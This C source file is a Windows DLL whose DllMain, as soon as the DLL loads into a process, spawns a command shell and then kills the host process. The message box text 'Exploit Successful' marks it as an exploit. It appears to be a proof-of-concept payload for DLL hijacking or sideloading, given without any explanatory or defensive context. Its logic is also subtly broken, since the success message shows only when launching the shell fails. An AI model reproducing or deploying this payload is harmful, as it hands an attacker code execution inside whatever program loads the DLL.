#include <windows.h>

#pragma comment(lib, "USER32")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof si;

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            // attach to process
            if (CreateProcess(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                MessageBox(NULL, "Exploit Successful", "Exploit", MB_OK);
            }

            ExitProcess(0);
            break;
        case DLL_PROCESS_DETACH:
            // detach from process
            break;

        case DLL_THREAD_ATTACH:
            // attach to thread
            break;

        case DLL_THREAD_DETACH:
            // detach from thread
            break;
    }
    return TRUE; // succesful
}
